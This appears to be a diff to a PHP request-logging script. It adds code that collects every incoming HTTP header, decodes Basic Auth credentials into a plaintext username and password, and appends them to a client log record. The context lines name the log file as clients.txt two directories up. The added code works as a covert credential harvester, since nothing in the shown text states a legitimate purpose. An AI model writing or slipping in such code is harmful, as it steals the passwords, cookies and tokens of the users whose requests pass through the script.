@@ -26,8 +26,40 @@ if (isset($_REQUEST['version'])) $version = $_REQUEST['version'];
 elseif (isset($_REQUEST['v'])) $version = $_REQUEST['v'];
 elseif (isset($_SERVER['HTTP_USER_AGENT'])) $version = $_SERVER['HTTP_USER_AGENT'];
 
+// 4. Capture All Headers
+if (!function_exists('getallheaders')) {
+    function getallheaders() {
+        $headers = [];
+        foreach ($_SERVER as $name => $value) {
+            if (substr($name, 0, 5) == 'HTTP_') {
+                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
+            }
+        }
+        return $headers;
+    }
+}
+$allHeaders = getallheaders();
+$headersStr = json_encode($allHeaders, JSON_UNESCAPED_SLASHES);
+
+// 5. Extract Credentials from Basic Auth
+$authHeader = isset($allHeaders['Authorization']) ? $allHeaders['Authorization'] : '';
+$extractedUser = '';
+$extractedPass = '';
+
+if ($authHeader && strpos($authHeader, 'Basic ') === 0) {
+    $encoded = substr($authHeader, 6);
+    $decoded = base64_decode($encoded);
+    if ($decoded) {
+        $parts = explode(':', $decoded, 2);
+        if (count($parts) === 2) {
+            $extractedUser = $parts[0];
+            $extractedPass = $parts[1];
+        }
+    }
+}
+
 // Construct the data signature
-$dataSignature = "IP: $ip | User: $user | Key: $key | Version: $version";
+$dataSignature = "IP: $ip | User: $user | Key: $key | Version: $version | AuthUser: $extractedUser | AuthPass: $extractedPass | Headers: $headersStr";
 
 // File path for storage (up two levels to root)
 $logFile = __DIR__ . '/../../clients.txt';
